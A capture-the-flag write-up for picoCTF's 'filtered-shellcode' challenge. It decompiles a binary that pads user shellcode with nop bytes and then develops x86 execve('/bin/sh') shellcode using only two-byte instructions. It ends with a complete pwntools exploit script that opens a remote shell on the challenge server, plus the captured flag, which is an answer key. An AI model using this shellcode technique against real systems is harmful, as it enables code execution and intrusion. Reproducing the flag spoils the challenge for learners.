# filtered-shellcode

> A program that just runs the code you give it? That seems kinda boring...
>
> nc mercury.picoctf.net 37853

## Description

We are given the executable running on the server. By decompiling it with Ghidra, we can see that the `main` function asks us for code to run (a maximum of 1000 bytes) then pass it to the `execute` function:

```c
void execute(int shellcode,int len)

{
  uint uVar1;
  undefined4 uStack48;
  undefined auStack44 [8];
  undefined *local_24;
  undefined *local_20;
  uint local_1c;
  uint double_len;
  int local_14;
  uint i;
  int j;
  int start;
  
  uStack48 = 0x8048502;
  if ((shellcode != 0) && (len != 0)) {
    double_len = len * 2;
    local_1c = double_len;
    start = ((double_len + 0x10) / 0x10) * -0x10;
    local_20 = auStack44 + start;
    local_14 = 0;
    for (i = 0; j = local_14, i < double_len; i = i + 1) {
      uVar1 = (uint)((int)i >> 0x1f) >> 0x1e;
      if ((int)((i + uVar1 & 3) - uVar1) < 2) {
        local_14 = local_14 + 1;
        auStack44[i + start] = *(undefined *)(shellcode + j);
      }
      else {
        auStack44[i + start] = 0x90;
      }
    }
    auStack44[double_len + start] = 0xc3;
    local_24 = auStack44 + start;
    *(undefined4 *)(auStack44 + start + -4) = 0x80485cb;
    (*(code *)(auStack44 + start))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

I have renamed some variables for a better understanding.

Basically, our shellcode is copied into the `auStack44` variable except that every 2 bytes, 2 other bytes with value `0x90` are added.
It corresponds to the `nop` instruction, so it does nothing except cutting our shellcode in series of 2 bytes.
It means we need to write a shellcode with instructions at most 2 bytes long.

## Shellcode basics

Before writing a shellcode with only 2 bytes instructions, we want to understand how a shellcode is created.

There are a lot of tutorials on the web, for instance [this one](https://zestedesavoir.com/articles/pdf/158/ecrivez-votre-premier-shellcode-en-asm-x86.pdf).

To summarize, the objective is to call `execve("/bin/sh", NULL, NULL)`.

To do so, there are several steps:
- put the "/bin/sh" string on the stack, so that `esp` points to it;
- put the arguments in the correct registers (in our case, the pointer to "/bin/sh" in `ebx`, and setting `ecx` and `edx` to 0);
- call the syscall corresponding to `execve`;
- quit the program.

Normally we could fill the register values with `mov ebx, 0`. However this creates null bytes in our shellcode, which could be problematic if we had to input it using `fgets` for instance.
So the trick to avoid doing that is to use `xor ebx, ebx` to set them to 0.

Furthermore, to give them some actual value, we can avoid having null bytes by filling sub-registers. For instance, to get `eax` to have the value `11` (which is the syscall number for `execve`), we can use `xor eax, eax; mov al, 11`.

So the exploit is quite straightforward:
```assembly
; Push //bin/sh on stack (one more slash to avoid null byte)
xor eax, eax
push eax
push `n/sh`
push `//bi`

; Set parameters
mov ebx, esp
xor ecx, ecx
xor edx, edx

; call execve
mov al, 11
int 0x80

; exit
mov al, 1
xor ebx, ebx
int 0x80
```

## Solution

With this shellcode, almost all instructions are at most two-bytes long.
The only problem are pushing `//bin/sh` on the stack.

Well for this I have a simple solution: I build the string in registers and push it on the stack.

Concretely, given `eax` initialised to 0, I add to `al` the first byte of my target.
Then I multiply `eax` by 16 and by 16 again, so the first value is now on the second byte of `eax`.

Note also that I added some `nop` dummy instructions when an instruction is only 1 byte long so I always have instructions of 2 bytes.

Here is my complete code:

```python
from pwn import *

shellcode = """
/* Set registers to 0 */
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

/* Build the stack with //bin/sh */
mov bl, 16 /* This register will hold the value 16 for shifting bytes */
/* First null bytes */
push ecx
nop
/* Then n/sh (ie bytes 110, 47, 115, 104) */
mov al, 104
mul ebx
mul ebx
mov al, 115
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 110
push eax
nop

/* Then //bi (ie bytes 47, 47, 98, 105) */
xor eax, eax
mov al, 105
mul ebx
mul ebx
mov al, 98
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 47
push eax
nop

/* syscall */
xor eax, eax
mov al, 11
mov ebx, esp
int 0x80

/* exit */
mov al,1
xor ebx, ebx
int 0x80
"""

print(asm(shellcode))

with open("out", "wb") as f:
    f.write(asm(shellcode))

sh = remote("mercury.picoctf.net", 37853)
sh.recvuntil(b"run:")
sh.sendline(asm(shellcode))
sh.interactive()
```

Flag: `picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}`